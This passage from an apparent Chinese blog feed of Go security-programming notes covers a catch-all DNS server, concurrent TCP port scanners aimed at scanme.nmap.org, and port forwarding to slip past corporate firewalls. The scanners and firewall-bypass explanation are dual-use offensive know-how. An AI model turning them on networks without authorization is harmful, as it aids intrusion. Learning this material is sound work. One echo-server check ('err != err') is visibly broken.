class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line">&lt;-tracker</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(gather)</span><br><span class="line">&lt;-tracker</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印结果</span></span><br><span class="line">w := tabwriter.NewWriter(os.Stdout, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;%s\t%s\n&quot;</span>, r.Hostname, r.IPAddress)</span><br><span class="line">&#125;</span><br><span class="line">w.Flush()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>原书作者的代码真的让我感到惊艳，尤其是关于管道的应用，通过管道，让子线程们就像一个公司的人一样工作，比如我们有100个子线程，那么就像100个人，9点上班，大家9点前陆续到位（依次开启线程）。然后9点，所有人准时到齐开始上班，打开一个总的文档（fqdns），老板一次将今天的任务放上去（123-125行），而大家从其中领取任务不断完成，每完成一个任务就将任务的结果给迟到的人力（老板吧任务都放到共享文档后才来（子域名全部放到管道中后才来，128行））。当老板发现，共享文档中没任务了（fqdns管道中没子域名了）遍把这个共享文档关了，员工发现，文档中没任务了或者文档干脆直接被关了，干完手上的任务与人力交接后，遍跟老板打卡下班。直到最后一个员工干完了活，与人力交接完成（人力并不知道是最后一员工，仍在等待下一个人的结果）。该员工到老板那打卡下班后，老板发现100个人走完了，便过去给人力电脑关机（关闭gather管道），人力知道没活了，便也打卡下班。留老板最后把结果打印出来。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.2DNS利用之服务端</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/5.2DNS%E5%88%A9%E7%94%A8%E4%B9%8B%E6%9C%8D%E5%8A%A1%E7%AB%AF/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/5.2DNS%E5%88%A9%E7%94%A8%E4%B9%8B%E6%9C%8D%E5%8A%A1%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>DNS服务器：Ubuntu18.04</p><p>下面镜像拖java。java8拖不了</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230129182734568-1675263857645.png" alt="image-20230129182734568"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/go/go1.17.8.linux-amd64.tar.gz</span><br><span class="line">tar -C /usr/local/ -xzf go1.17.8.linux-amd64.tar.gz</span><br><span class="line">不过呢，为了可以在任意路径下使用 go 命令，我们需要将 Go 二进制文件所在路径加入到环境变量 PATH 中，具体操作是将下面这行环境变量设置语句添加到 /etc/profile.d/go.sh 文件：</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/local/go</span><br><span class="line"><span class="built_in">export</span> GOPATH=/data/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOROOT</span>/bin:<span class="variable">$GOPATH</span></span><br><span class="line"><span class="built_in">export</span> GO111MODULE=<span class="string">&quot;on&quot;</span> <span class="comment"># 开启 Go moudles 特性</span></span><br><span class="line"><span class="built_in">export</span> GOPROXY=https://goproxy.cn,direct <span class="comment"># 安装 Go 模块时，国内代理服务器设置</span></span><br><span class="line"></span><br><span class="line">然后执行下面命令使上述环境变量的设置立即生效：</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h4 id="编写一个简单的DNS服务器"><a href="#编写一个简单的DNS服务器" class="headerlink" title="编写一个简单的DNS服务器"></a>编写一个简单的DNS服务器</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">/*******dns.HandleFunc()********/</span></span><br><span class="line">   <span class="comment">/******第一个参数：要匹配的查询模式(.表示处理所有请求)*******/</span></span><br><span class="line">   dns.HandleFunc(<span class="string">&quot;.&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w dns.ResponseWriter, req *dns.Msg)</span></span> &#123;</span><br><span class="line">      <span class="keyword">var</span> resp dns.Msg    </span><br><span class="line">      resp.SetReply(req)  <span class="comment">//创建新消息并设置回复</span></span><br><span class="line">      <span class="keyword">for</span> _, q := <span class="keyword">range</span> req.Question &#123;  <span class="comment">//遍历</span></span><br><span class="line">         a := dns.A&#123;   <span class="comment">//使用A记录为每个询问创建应答</span></span><br><span class="line">            Hdr: dns.RR_Header&#123;</span><br><span class="line">               Name:   q.Name,</span><br><span class="line">               Rrtype: dns.TypeA,</span><br><span class="line">               Class:  dns.ClassINET,</span><br><span class="line">               Ttl:    <span class="number">0</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            A: net.ParseIP(<span class="string">&quot;127.0.0.1&quot;</span>).To4(),</span><br><span class="line">         &#125;</span><br><span class="line">         resp.Answer = <span class="built_in">append</span>(resp.Answer, &amp;a)  <span class="comment">//将响应内容附加到响应字段Answer中</span></span><br><span class="line">      &#125;</span><br><span class="line">      w.WriteMsg(&amp;resp)  <span class="comment">//响应完成后，将消息写入调用客户端</span></span><br><span class="line">   &#125;)</span><br><span class="line">   log.Fatal(dns.ListenAndServe(<span class="string">&quot;:53&quot;</span>, <span class="string">&quot;udp&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>运行时要解决端口占用的情况（这里弄了很久）</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230130124333353-1675263857646.png" alt="image-20230130124333353"></p></li><li><p>使用dig进行测试。确认你要查询的主机名解析为127.0.0.1。</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230130124459002-1675263857646.png" alt="image-20230130124459002"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.TCP、扫描器和代理</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/2.TCP%E3%80%81%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E4%BB%A3%E7%90%86/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/2.TCP%E3%80%81%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="TCP握手机制"><a href="#TCP握手机制" class="headerlink" title="TCP握手机制"></a>TCP握手机制</h2><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230117114103918.png" alt="image-20230117114103918" style="zoom:67%;" /><h2 id="端口转发绕过防火墙"><a href="#端口转发绕过防火墙" class="headerlink" title="端口转发绕过防火墙"></a>端口转发绕过防火墙</h2><ul><li><p>某些情况下，可以使用中间系统代理连接绕过或穿透防火墙从而避开这些限制，这种技术被称为<strong>端口转发</strong></p></li><li><p>许多企业网络限制内部资产建立与恶意站点的H∏P连接。假设有一个名为evil.com的恶意网站，如果有员工尝试直接测览evil.com，则防火墙会阻止该请求°但是,如果员工拥有允许通过防火墙的外部系统（例如stacktitan.com），则该员工可以利用允许的域来反弹与evil.com的连接</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230117114441819.png" alt="image-20230117114441819"></p></li><li><p>可以使用端口转发绕过多种限制性网络配置。例如：可以通过跳箱转发流量，以访问分段网络或访问绑定到限制性接口的端口</p></li></ul><h2 id="编写一个TCP扫描器"><a href="#编写一个TCP扫描器" class="headerlink" title="编写一个TCP扫描器"></a>编写一个TCP扫描器</h2><h4 id="要使用的包"><a href="#要使用的包" class="headerlink" title="要使用的包"></a>要使用的包</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.Dial(network, address <span class="type">string</span>)</span><br></pre></td></tr></table></figure><ul><li>第一个参数是一个字符串，用于标识要启动的连接的类型。这是因为Dil不仅适用于TCP,它还可以用于创建使用UNIX套接字、UDP和第4层协议的连接。你可以使用其他字符串，但为简洁起见，这里将使用字符串tcp。</li></ul><h4 id="普通版本"><a href="#普通版本" class="headerlink" title="普通版本"></a>普通版本</h4><h5 id="仅扫描一个端口"><a href="#仅扫描一个端口" class="headerlink" title="仅扫描一个端口"></a>仅扫描一个端口</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">_, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;scanme.nmap.org:80&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Connection successful&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="扫描1024个端口"><a href="#扫描1024个端口" class="headerlink" title="扫描1024个端口"></a>扫描1024个端口</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">addr := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>, i)</span><br><span class="line">conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//fmt.Println(&quot;Connection Fail&quot;)</span></span><br><span class="line"><span class="keyword">continue</span> <span class="comment">// 端口已关闭或者过滤</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>, i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="并发版本"><a href="#并发版本" class="headerlink" title="并发版本"></a>并发版本</h4><h5 id="“极速”的端口扫描"><a href="#“极速”的端口扫描" class="headerlink" title="“极速”的端口扫描"></a>“极速”的端口扫描</h5><ul><li>运行完上面代码后，程序几乎立刻退出了。</li><li>刚才运行的代码会为每个连接启动一个goroutine，而主goroutine并不知道要等待连<br>接发生。因此，代码在for循环完成迭代后回退出。</li><li>这可能比代码与目标端口之间的数据包网络交换还要快。对于数据包仍在运行的端口，可能无法获得其准确的结果</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">addr := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>, i)</span><br><span class="line">conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//fmt.Println(&quot;Connection Fail&quot;)</span></span><br><span class="line"><span class="keyword">return</span> <span class="comment">// 端口已关闭或者过滤</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>, i)</span><br><span class="line">&#125;(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>解决方案：</p><ol><li><p>使用sync包中的WajtGroup进行同步扫描</p></li><li></li></ol></li></ul><h5 id="使用WaitGroup进行同步扫描"><a href="#使用WaitGroup进行同步扫描" class="headerlink" title="使用WaitGroup进行同步扫描"></a>使用WaitGroup进行同步扫描</h5><ul><li>创建WaitGroup后，可以在此结构体上调用一些方法。第一个是Add(i),它将按所提供的数字递增内部计数器。接下来，Done()将计数器减1。最后，Wait()会阻止在其中调用它的goroutine的执行，并且在内部计数器达到零之前将不允许进一步执行。你可以组合这些调用以确保主goroutine等待所有连接完成。</li><li>该程序比初始版本有了进步，但仍然不算是正确的。如果对多个主机多次执行此程<br>序，则可能会看到不一致的结果</li><li>同时扫描过多的主机或端口可能会导致网络或系统限制，造成结果不正确</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup <span class="comment">//1     用作同步计数器</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>) <span class="comment">//2    通过wg.Add(1)递增计数器</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> wg.Done() <span class="comment">//3      只要执行对一个端口的扫描，对wg.Done()的延迟调用就会使计数器递减</span></span><br><span class="line">addr := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>, i)</span><br><span class="line">conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//fmt.Println(&quot;Connection Fail&quot;)</span></span><br><span class="line"><span class="keyword">return</span> <span class="comment">// 端口已关闭或者过滤</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>, i)</span><br><span class="line">&#125;(i)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait() <span class="comment">//4   阻塞main函数，直到所有工作完成并且计数器值为0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用工人池进行端口扫描"><a href="#使用工人池进行端口扫描" class="headerlink" title="使用工人池进行端口扫描"></a>使用工人池进行端口扫描</h5><ul><li>为避免结果不一致，我们需要使用goroutine池管理正在进行的并发工作。使用for循环创建一定数量的工人goroutine作为资源池：然后，在main()线程中使用通道提供工作。</li><li>有趣的现象:数字不是以特定的顺序打印的；欢迎来到精彩的并行世界。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(ports <span class="keyword">chan</span> <span class="type">int</span>, wg *sync.WaitGroup)</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> p := <span class="keyword">range</span> ports &#123;</span><br><span class="line">      fmt.Println(p)</span><br><span class="line">      wg.Done()</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> wg sync.WaitGroup <span class="comment">//1     用作同步计数器</span></span><br><span class="line"></span><br><span class="line">   ports := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>) <span class="comment">//创建管道，缓冲区为100</span></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">cap</span>(ports); i++ &#123;</span><br><span class="line">      <span class="keyword">go</span> worker(ports, &amp;wg)   <span class="comment">//并发工作，再收到ports&lt;-i才会开始工作</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++ &#123;</span><br><span class="line">      wg.Add(<span class="number">1</span>)</span><br><span class="line">      ports &lt;- i</span><br><span class="line">   &#125;</span><br><span class="line">   wg.Wait()</span><br><span class="line">   <span class="built_in">close</span>(ports) <span class="comment">//关闭管道</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="最终版本：多通道通信"><a href="#最终版本：多通道通信" class="headerlink" title="最终版本：多通道通信"></a>最终版本：多通道通信</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(ports <span class="keyword">chan</span> <span class="type">int</span>, results <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> p := <span class="keyword">range</span> ports &#123;</span><br><span class="line">      addr := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>, p)</span><br><span class="line">      conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, addr)</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">          results &lt;- <span class="number">0</span>  <span class="comment">//没有打开的端口送给results管道赋值0(总感觉有点低效)</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      conn.Close()  <span class="comment">//关闭连接</span></span><br><span class="line">      results &lt;- p  <span class="comment">//打开的端口送给results管道</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   ports := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>)</span><br><span class="line">   results := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>) <span class="comment">//没有限制</span></span><br><span class="line">   <span class="keyword">var</span> openports []<span class="type">int</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">cap</span>(ports); i++ &#123;  <span class="comment">//100个工人疯狂工作哈哈</span></span><br><span class="line">      <span class="keyword">go</span> worker(ports, results)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; <span class="comment">//1024个端口号传入ports管道</span></span><br><span class="line">      <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">         ports &lt;- i</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++ &#123; <span class="comment">//从results管道取出数据</span></span><br><span class="line">      port := &lt;-results</span><br><span class="line">      <span class="keyword">if</span> port != <span class="number">0</span> &#123;</span><br><span class="line">         openports = <span class="built_in">append</span>(openports, port)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">close</span>(ports)  <span class="comment">//关闭管道</span></span><br><span class="line">   <span class="built_in">close</span>(results)</span><br><span class="line">   sort.Ints(openports)  <span class="comment">//对开启的端口做个排序</span></span><br><span class="line">   <span class="keyword">for</span> _, port := <span class="keyword">range</span> openports &#123; <span class="comment">//输出</span></span><br><span class="line">      fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>, port)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造TCP代理"><a href="#构造TCP代理" class="headerlink" title="构造TCP代理"></a>构造TCP代理</h2><h3 id="io-Reader和io-Writer"><a href="#io-Reader和io-Writer" class="headerlink" title="io.Reader和io.Writer"></a>io.Reader和io.Writer</h3><ul><li><p>对于I&#x2F;0任务来说，这两种数据类型是必不可少的</p></li><li><p>&#96;&#96;&#96;go<br>type Reader interface {<br>Read(p []byte) (n int, err error)<br>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 自定义包装实现接口</span><br><span class="line"></span><br><span class="line">- ```go</span><br><span class="line">  type FooWriter struct &#123;&#125;</span><br><span class="line">  func (fooWriter *FooWriter) Write(p []byte) (int, error)&#123;</span><br><span class="line">      return len(dataWrittenSomewhere), nil</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="reader和Writer演示"><a href="#reader和Writer演示" class="headerlink" title="reader和Writer演示"></a>reader和Writer演示</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> myreader <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*myreader)</span></span> Read(b []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   fmt.Println(<span class="string">&quot;&gt;read:&quot;</span>)</span><br><span class="line">   <span class="keyword">return</span> os.Stdin.Read(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> mywriter <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*mywriter)</span></span> Write(b []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   fmt.Println(<span class="string">&quot;&gt;write:&quot;</span>)</span><br><span class="line">   <span class="keyword">return</span> os.Stdout.Write(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> (</span><br><span class="line">      r myreader</span><br><span class="line">      w mywriter</span><br><span class="line">   )</span><br><span class="line">   input := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>)</span><br><span class="line">   read, err := r.Read(input)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;read %d from stdin\n&quot;</span>, read)</span><br><span class="line">   write, err := w.Write(input)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;write %d from stdout\n&quot;</span>, write)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>read:<br>hello 2023!!!<br>read 15 from stdin<br>write:<br>hello 2023!!!<br>write 1024 from stdout</p></blockquote><h4 id="io-Copy"><a href="#io-Copy" class="headerlink" title="io.Copy()"></a>io.Copy()</h4><ul><li>将数据从Reader复制到Writer是一种非常常见的模式,这促使Go的io包中提供一个函数Copy()该函数可用于简化函数main()函数Copy()原型如下：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230119105051430.png" alt="image-20230119105051430"></p><h3 id="创建回显-echo-服务器"><a href="#创建回显-echo-服务器" class="headerlink" title="创建回显(echo)服务器"></a>创建回显(echo)服务器</h3><h5 id="基本回显server-go"><a href="#基本回显server-go" class="headerlink" title="基本回显server.go"></a>基本回显server.go</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">   <span class="keyword">defer</span> conn.Close()</span><br><span class="line">   b := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> &#123;</span><br><span class="line">      size, err := conn.Read(b[<span class="number">0</span>:])</span><br><span class="line">      <span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">         log.Println(<span class="string">&quot;Client disconnected&quot;</span>)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> err != err &#123;</span><br><span class="line">         log.Println(<span class="string">&quot;connection 